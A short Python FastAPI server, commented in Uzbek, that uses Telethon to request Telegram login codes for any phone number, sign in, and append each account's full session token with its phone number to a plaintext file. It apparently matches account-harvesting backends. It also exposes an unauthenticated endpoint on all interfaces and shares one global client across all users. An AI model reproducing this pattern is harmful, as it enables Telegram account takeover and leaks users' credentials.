from telethon import TelegramClient
from telethon.sessions import StringSession
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

# O'zingizning ma'lumotlaringizni kiriting
API_ID = 1234567  # O'zingizniki bilan almashtiring
API_HASH = 'your_api_hash_here'

app = FastAPI()
client = None # Global client

class LoginRequest(BaseModel):
    phone: str
    code: str = None
    phone_code_hash: str = None

@app.post("/send_code")
async def send_code(req: LoginRequest):
    global client
    # Har bir so'rov uchun yangi sessiya obyekti
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    result = await client.send_code_request(req.phone)
    return {"phone_code_hash": result.phone_code_hash}

@app.post("/login")
async def login(req: LoginRequest):
    global client
    try:
        await client.sign_in(req.phone, req.code, phone_code_hash=req.phone_code_hash)
        
        # SESSIA SHU YERDA YARALADI
        session_str = client.session.save() 
        
        # Sessiyani faylga yoki bazaga saqlash
        with open("active_sessions.txt", "a") as f:
            f.write(f"Phone: {req.phone} | Session: {session_str}\n")
            
        return {"status": "success", "session": "Sessiya saqlandi!"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)